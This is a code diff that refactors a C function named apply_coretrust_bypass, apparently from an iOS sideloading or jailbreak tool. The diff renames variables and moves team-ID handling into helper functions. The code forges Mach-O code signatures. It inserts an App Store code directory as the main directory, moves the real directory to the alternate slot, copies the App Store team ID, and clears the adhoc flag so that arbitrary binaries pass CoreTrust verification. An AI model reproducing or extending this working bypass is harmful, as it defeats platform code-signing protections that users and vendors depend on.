@@ -210,29 +210,29 @@ int apply_coretrust_bypass(const char *machoPath)
     uint64_t originalCodeSignatureSize = BIG_TO_HOST(superblob->length);
     free(superblob);
 
-    CS_DecodedBlob *realCodeDirectoryBlob = NULL;
-    CS_DecodedBlob *mainCodeDirectoryBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
-    CS_DecodedBlob *alternateCodeDirectoryBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
+    CS_DecodedBlob *realCodeDirBlob = NULL;
+    CS_DecodedBlob *mainCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
+    CS_DecodedBlob *alternateCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
 
-    if (!mainCodeDirectoryBlob) {
+    if (!mainCodeDirBlob) {
         printf("Error: Unable to find code directory, make sure the input binary is ad-hoc signed?\n");
         return -1;
     }
 
     // We need to determine which code directory to transfer to the new binary
-    if (alternateCodeDirectoryBlob) {
+    if (alternateCodeDirBlob) {
         // If an alternate code directory exists, use that and remove the main one from the superblob
-        realCodeDirectoryBlob = alternateCodeDirectoryBlob;
-        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirectoryBlob);
-        csd_blob_free(mainCodeDirectoryBlob);
+        realCodeDirBlob = alternateCodeDirBlob;
+        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirBlob);
+        csd_blob_free(mainCodeDirBlob);
     }
     else {
         // Otherwise use the main code directory
-        realCodeDirectoryBlob = mainCodeDirectoryBlob;
+        realCodeDirBlob = mainCodeDirBlob;
     }
-    
+
     CS_CodeDirectory *realCD = malloc(sizeof(CS_CodeDirectory));
-    csd_blob_read(realCodeDirectoryBlob, 0, sizeof(CS_CodeDirectory), realCD);
+    csd_blob_read(realCodeDirBlob, 0, sizeof(CS_CodeDirectory), realCD);
     CODE_DIRECTORY_APPLY_BYTE_ORDER(realCD, BIG_TO_HOST_APPLIER);
     if (realCD->hashType != CS_HASHTYPE_SHA256_256) {
         printf("Error: Alternate code directory is not SHA256, bypass won't work!\n");
@@ -242,9 +242,9 @@ int apply_coretrust_bypass(const char *machoPath)
     printf("Applying App Store code directory...\n");
 
     // Append real code directory as alternateCodeDirectory at the end of superblob
-    csd_superblob_remove_blob(decodedSuperblob, realCodeDirectoryBlob);
-    csd_blob_set_type(realCodeDirectoryBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
-    csd_superblob_append_blob(decodedSuperblob, realCodeDirectoryBlob);
+    csd_superblob_remove_blob(decodedSuperblob, realCodeDirBlob);
+    csd_blob_set_type(realCodeDirBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
+    csd_superblob_append_blob(decodedSuperblob, realCodeDirBlob);
 
     // Insert AppStore code directory as main code directory at the start
     CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)AppStoreCodeDirectory);
@@ -273,77 +273,23 @@ int apply_coretrust_bypass(const char *machoPath)
 
     // Get team ID from AppStore code directory
     // For the bypass to work, both code directories need to have the same team ID
-    char *appStoreTeamID = NULL;
-    if (appStoreCodeDirectoryBlob != NULL) {
-        CS_CodeDirectory appStoreCodeDirectory;
-        csd_blob_read(appStoreCodeDirectoryBlob, 0, sizeof(appStoreCodeDirectory), &appStoreCodeDirectory);
-        CODE_DIRECTORY_APPLY_BYTE_ORDER(&appStoreCodeDirectory, BIG_TO_HOST_APPLIER);
-        csd_blob_read_string(appStoreCodeDirectoryBlob, appStoreCodeDirectory.teamOffset, &appStoreTeamID);
-    }
+    char *appStoreTeamID = csd_code_directory_copy_team_id(appStoreCodeDirectoryBlob, NULL);
     if (!appStoreTeamID) {
-        printf("Error: Unable to determine AppStore TeamID\n");
+        printf("Error: Unable to determine AppStore Team ID\n");
         return -1;
     }
 
     // Set the team ID of the real code directory to the AppStore one
-    size_t appStoreTeamIDSize = strlen(appStoreTeamID)+1;
-    if (realCodeDirectoryBlob != NULL) {
-        CS_CodeDirectory codeDir;
-        csd_blob_read(realCodeDirectoryBlob, 0, sizeof(codeDir), &codeDir);
-        CODE_DIRECTORY_APPLY_BYTE_ORDER(&codeDir, BIG_TO_HOST_APPLIER);
-
-        int32_t shift = 0;
-        uint32_t initalTeamOffset = codeDir.teamOffset;
-
-        // If there is already a TeamID, delete it
-        if (initalTeamOffset != 0) {
-            uint32_t existingTeamIDSize = 0;
-            char *existingTeamID = NULL;
-            csd_blob_read_string(realCodeDirectoryBlob, initalTeamOffset, &existingTeamID);
-            existingTeamIDSize = strlen(existingTeamID)+1;
-            free(existingTeamID);
-
-            csd_blob_delete(realCodeDirectoryBlob, initalTeamOffset, existingTeamIDSize);
-            shift -= existingTeamIDSize;
-        }
-
-        // Insert new TeamID
-        if (codeDir.identOffset == 0) {
-            printf("No identity found, that's bad.\n");
-            free(appStoreTeamID);
-            return -1;
-        }
-        char *ident = NULL;
-        csd_blob_read_string(realCodeDirectoryBlob, codeDir.identOffset, &ident);
-        uint32_t newTeamOffset = codeDir.identOffset + strlen(ident) + 1;
-        free(ident);
-        csd_blob_insert(realCodeDirectoryBlob, newTeamOffset, appStoreTeamIDSize, appStoreTeamID);
-        shift += appStoreTeamIDSize;
-        
-        codeDir.teamOffset = newTeamOffset;
-
-        // Offsets that point to after the TeamID have to be shifted
-        if (codeDir.hashOffset != 0 && codeDir.hashOffset > initalTeamOffset) {
-            codeDir.hashOffset += shift;
-        }
-        if (codeDir.scatterOffset != 0 && codeDir.scatterOffset > initalTeamOffset) {
-            codeDir.scatterOffset += shift;
-        }
-
-        CODE_DIRECTORY_APPLY_BYTE_ORDER(&codeDir, HOST_TO_BIG_APPLIER);
-        csd_blob_write(realCodeDirectoryBlob, 0, sizeof(codeDir), &codeDir);
-    }
-    else {
-        printf("Failed to locate actual CD blob.\n");
-        free(appStoreTeamID);
+    if (csd_code_directory_set_team_id(realCodeDirBlob, appStoreTeamID) != 0) {
+        printf("Error: Failed to set Team ID\n");
         return -1;
     }
+
     printf("TeamID set to %s!\n", appStoreTeamID);
     free(appStoreTeamID);
 
-    // Set flags to 0 to remove any problematic flags (such as the 'adhoc' flag in Bit 2)
-    uint32_t newFlags = 0;
-    csd_blob_write(realCodeDirectoryBlob, offsetof(CS_CodeDirectory, flags), sizeof(newFlags), &newFlags); 
+    // Set flags to 0 to remove any problematic flags (such as the 'adhoc' flag in bit 2)
+    csd_code_directory_set_flags(realCodeDirBlob, 0);
 
     printf("Encoding unsigned superblob...\n");
     CS_SuperBlob *encodedSuperblobUnsigned = csd_superblob_encode(decodedSuperblob);
@@ -356,7 +302,7 @@ int apply_coretrust_bypass(const char *machoPath)
     free(encodedSuperblobUnsigned);
 
     printf("Updating code slot hashes...\n");
-    csd_code_directory_update(realCodeDirectoryBlob, macho);
+    csd_code_directory_update(realCodeDirBlob, macho);
 
     int ret = 0;
     printf("Signing binary...\n");
